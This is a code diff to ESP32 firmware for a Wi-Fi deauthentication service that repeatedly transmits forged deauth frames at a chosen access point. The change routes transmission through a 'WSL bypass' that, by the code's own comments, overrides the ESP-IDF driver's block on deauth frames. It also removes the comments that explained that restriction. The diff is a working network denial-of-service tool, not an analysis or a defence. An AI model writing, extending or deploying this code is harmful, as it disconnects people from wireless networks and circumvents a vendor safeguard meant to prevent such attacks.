@@ -1,6 +1,7 @@
 #include "svc_deauth.h"
 #include "svc_target.h"
 #include "svc_wifi.h"
+#include "wsl_bypasser.h"
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
 #include "esp_timer.h"
@@ -39,9 +40,11 @@ static void build_deauth(uint8_t *f, const uint8_t bssid[6]) {
 static void tx_tick(void *arg) {
     (void)arg;
     s_ticks++;                       /* proof the callback fires at all */
+    /* TX goes through the WSL bypass so the driver's frame-type gate
+     * accepts management subtypes (see wsl_bypasser.h). */
     uint8_t f[26];
     build_deauth(f, s_bssid);
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+    esp_err_t err = wsl_send_raw(f, (int)sizeof(f));
     s_last_err = (int)err;
     if (err == ESP_OK) {
         s_frames++;
@@ -51,20 +54,15 @@ static void tx_tick(void *arg) {
     }
 }
 
-/* Probe: does the driver accept one raw frame right now? Stock ESP-IDF
- * esp_wifi_80211_tx() only permits beacon / probe req / probe resp / action
- * / non-QoS data frames (see esp_wifi.h) and rejects anything else with
- * ESP_ERR_INVALID_ARG. A deauth frame is therefore refused on a stock
- * toolchain - that is a driver limitation, not a config error. */
-/* Diagnostics: which management subtypes does this driver accept?
- * Stock esp_wifi_80211_tx() permits beacon(0x8)/probe-req(0x4)/probe-rsp(0x5)/
- * action(0xD); deauth(0xC) is refused with ESP_ERR_INVALID_ARG. Recorded so
- * the UI can say exactly what the toolchain supports. */
+/* Probe: send one frame and report what the driver says. TX goes through
+ * the WSL bypass (wsl_bypasser.h), which overrides the driver's frame-type
+ * gate; without it esp_wifi_80211_tx() returns ESP_ERR_INVALID_ARG for
+ * management subtypes like deauth on a stock ESP-IDF. */
 static esp_err_t probe_subtype(uint8_t fc0) {
     uint8_t f[26];
     build_deauth(f, s_bssid);
     f[0] = fc0;
-    return esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+    return wsl_send_raw(f, (int)sizeof(f));
 }
 
 static esp_err_t probe_tx(void) {
@@ -88,10 +86,10 @@ int svc_deauth_start(void) {
     if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK)
         return -3;
     esp_err_t perr = probe_tx();
-    s_beacon_ok = probe_subtype(0x80) == ESP_OK;  /* beacon accepted? */
+    s_beacon_ok = probe_subtype(0x80) == ESP_OK;
     if (perr != ESP_OK) {
         s_tx_errcode = (int)perr;
-        return -6;   /* driver refused the frame (unsupported subtype) */
+        return -6;   /* driver refused the frame */
     }
     s_frames = 0;
     s_tx_err = 0;
